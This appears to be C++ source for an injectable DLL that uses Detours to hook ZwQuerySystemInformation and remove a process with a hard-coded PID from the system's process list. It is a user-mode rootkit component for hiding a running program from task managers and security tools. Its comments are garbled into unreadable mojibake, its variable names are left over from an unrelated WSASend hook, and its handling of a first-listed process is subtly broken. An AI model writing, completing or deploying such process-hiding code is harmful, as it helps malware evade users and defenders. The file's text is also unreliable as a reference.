#include "pch.h"


VOID ShowError(PCHAR msg);
DWORD WINAPI ThreadProc(LPVOID lpParameter);
DWORD GetPid(PCHAR pProName); //���ݽ�������ȡҪ���صĽ��̵�PID

DWORD g_dwOrgAddr = 0;   //ԭ������ַ
CHAR g_szOrgBytes[5] = { 0 };  //���溯����ǰ����ֽ�
DWORD g_dwHidePID = 15460;   //Ҫ���صĽ��̵�PID
// ���庯��ָ�����ͣ����ڱ���ԭʼ�� wsasend ����
typedef
NTSTATUS
(WINAPI* pfnZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

// ����ԭʼ�� wsasend ����ָ��
pfnZwQuerySystemInformation RealWsaSend = NULL;

// �Զ���� HookedWsaSend ����
NTSTATUS WINAPI MyZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	pfnZwQuerySystemInformation dwOrgFuncAddr = 0;


	//��ȡ������ַ
	dwOrgFuncAddr = RealWsaSend;



	status = ((pfnZwQuerySystemInformation)dwOrgFuncAddr)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	//�жϺ����Ƿ���óɹ����Լ��Ƿ��ǲ�ѯ���̵Ĳ���
	if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			//�ж��Ƿ���Ҫ���صĽ���
			if (g_dwHidePID == (DWORD)pCur->UniqueProcessId)
			{
				//��������������
				if (pPrev == NULL)   SystemInformation = (PBYTE)pCur + pCur->NextEntryOffset;
				else if (pCur->NextEntryOffset == 0) pPrev->NextEntryOffset = 0;
				else pPrev->NextEntryOffset += pCur->NextEntryOffset;
				break;
			}
			else pPrev = pCur;

			//���û����һ���ɹ����˳� 
			if (pCur->NextEntryOffset == 0) break;

			//��ָ��ָ����һ����Ա
			pCur = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCur + pCur->NextEntryOffset);
		}
	}
	//����HOOK
	return status;
}

void HookZwQuerySystemInformation() {
	//MessageBox(NULL, "This Is From Dll!\nInject Success!", "OK", MB_OK);
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	// ��ȡԭʼ wsasend �����ĵ�ַ
	RealWsaSend = (pfnZwQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");

	// �� wsasend �������� Hook�������滻Ϊ�Զ���� HookedWsaSend ����
	DetourAttach(&(PVOID&)RealWsaSend, MyZwQuerySystemInformation);

	// ��� Hook ����
	DetourTransactionCommit();
}